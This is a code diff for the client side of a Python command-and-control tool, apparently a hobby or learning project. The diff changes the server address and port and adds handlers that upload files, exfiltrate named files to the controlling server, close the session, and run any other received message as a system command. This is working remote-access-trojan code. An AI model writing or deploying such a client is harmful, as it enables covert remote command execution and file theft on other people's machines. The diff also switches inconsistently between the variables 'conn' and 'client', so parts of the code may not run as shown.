@@ -9,9 +9,9 @@ from C2utils import snd_msg, get_msg, snd_file, get_file
 
 #############################
 ## ========  Config  ========
-PORT = 5052 ## CONFIGURE THIS
-#SERVER = socket.gethostbyname(socket.gethostname()) ## CONFIGURE THIS
-SERVER = '10.96.10.191'
+PORT = 5053 ## CONFIGURE THIS
+SERVER = socket.gethostbyname(socket.gethostname()) ## CONFIGURE THIS
+#SERVER = '127.0.0.1'
 ## --------------------------
 FORMAT = 'utf-8'
 ADDR = (SERVER, PORT)
@@ -48,4 +48,33 @@ def listen_to_server(conn):
                 os.chdir(abs_path)
                 snd_msg(conn, os.getcwd())
             except:
-                snd_msg(conn, "Failed to change dire
+                snd_msg(conn, "Failed to change directory.")
+
+        ## Put
+        elif msg[:3] == "put":
+            get_file(client)
+        
+        ## Grab
+        elif msg[:4] == "grab":
+            filename = get_msg(client)
+            try:
+                filesize = os.path.getsize(filename)
+            except:
+                snd_msg(client, f"Couldn't open {filename}.")
+                continue
+            
+            snd_msg(client, f"SUCCESS")
+            snd_file(client, filename) ## Sends the file to the server
+
+        ## Close
+        elif msg[:5] == "close":
+            client.close()
+            print("Killed by server.")
+            connected = False
+
+        else:
+            execute_command(client, msg)
+    conn.close()
+
+## ======== Client-Start ========
+listen_to_server(client)
